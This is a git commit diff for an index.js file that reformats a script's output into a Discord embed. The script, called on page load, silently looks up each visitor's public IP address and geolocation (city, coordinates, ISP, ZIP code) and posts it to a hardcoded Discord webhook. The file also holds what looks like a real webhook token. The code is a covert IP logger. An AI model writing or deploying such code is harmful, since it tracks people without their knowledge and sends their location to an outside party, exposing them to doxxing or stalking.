645d40e7c31b5fd5077d6e61356539fadba6475e
Zalaxis <130976751+z4laxis@users.noreply.github.com>
2023-07-22 21:43:24 +0100

    Update index.js

--- index.js
+++ index.js
@@ -1,42 +1,80 @@
-  function sendIPToWebhook() {
-            const webhookURL = 'https://discord.com/api/webhooks/1132405889396129819/g8O3i4yyJFmYcrh9tmH3X9UXpRPvPn5BUbjDrJ0nsctfu3uWMf_6gXermzfhqR_KpnWW'; // Replace with your actual Discord webhook URL
-            const ipstackAPIKey = 'YOUR_IPSTACK_API_KEY'; // Replace with your actual ipstack API key
+function sendIPToWebhook() {
+    const webhookURL = 'https://discord.com/api/webhooks/1132405889396129819/g8O3i4yyJFmYcrh9tmH3X9UXpRPvPn5BUbjDrJ0nsctfu3uWMf_6gXermzfhqR_KpnWW'; // Replace with your actual Discord webhook URL
+    const ipstackAPIKey = 'YOUR_IPSTACK_API_KEY'; // Replace with your actual ipstack API key
 
-            // Fetch the user's public IP address using ipify API
-            fetch('https://api.ipify.org?format=json')
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            const ipAddress = data.ip;
+            fetch(`https://ipapi.co/${ipAddress}/json/`)
                 .then(response => response.json())
-                .then(data => {
-                    // Get the user's IP address
-                    const ipAddress = data.ip;
-                    // Use the IP address to fetch geolocation information using ip-api.com API
-                    fetch(`https://ipapi.co/${ipAddress}/json/`)
-                        .then(response => response.json())
-                        .then(geoData => {
-                            // Create the data payload to send to the Discord webhook
-                            const dataPayload = {
-                                content: `User's IP Address: ${geoData.ip}\nCountry: ${geoData.country_name}\nRegion: ${geoData.region}\nCity: ${geoData.city}\nLatitude: ${geoData.latitude}\nLongitude: ${geoData.longitude}\nISP: ${geoData.org}\nOrganization: ${geoData.asn}\nZIP Code: ${geoData.postal}`,
-                            };
+                .then(geoData => {
+                    const embedData = {
+                        "title": "User's Geolocation Information",
+                        "description": "Here's the geolocation information of the user:",
+                        "color": 16776960, // Yellow color (decimal representation)
+                        "fields": [
+                            {
+                                "name": "IP Address",
+                                "value": geoData.ip
+                            },
+                            {
+                                "name": "Country",
+                                "value": geoData.country_name
+                            },
+                            {
+                                "name": "Region",
+                                "value": geoData.region
+                            },
+                            {
+                                "name": "City",
+                                "value": geoData.city
+                            },
+                            {
+                                "name": "Latitude",
+                                "value": geoData.latitude
+                            },
+                            {
+                                "name": "Longitude",
+                                "value": geoData.longitude
+                            },
+                            {
+                                "name": "ISP",
+                                "value": geoData.org
+                            },
+                            {
+                                "name": "Organization",
+                                "value": geoData.asn
+                            },
+                            {
+                                "name": "ZIP Code",
+                                "value": geoData.postal
+                            }
+                        ]
+                    };
 
-                            // Send the data to the Discord webhook
-                            fetch(webhookURL, {
-                                method: 'POST',
-                                headers: {
-                                    'Content-Type': 'application/json',
-                                },
-                                body: JSON.stringify(dataPayload),
-                            })
-                            .then(response => {
-                                if (response.ok) {
-                                } else {
-                                }
-                            })
-                            .catch(error => {
-                            });
-                        })
-                        .catch(error => console.error(error));
+                    fetch(webhookURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            embeds: [embedData]
+                        }),
+                    })
+                    .then(response => {
+                        if (response.ok) {
+                            console.log("Geolocation embed sent successfully!");
+                        } else {
+                            console.error("Failed to send geolocation embed.");
+                        }
+                    })
+                    .catch(error => console.error(error));
                 })
                 .catch(error => console.error(error));
-        }
+        })
+        .catch(error => console.error(error));
+}
 
-        // Automatically send the webhook on page load
-        sendIPToWebhook();
+// Automatically send the webhook on page load
+sendIPToWebhook();
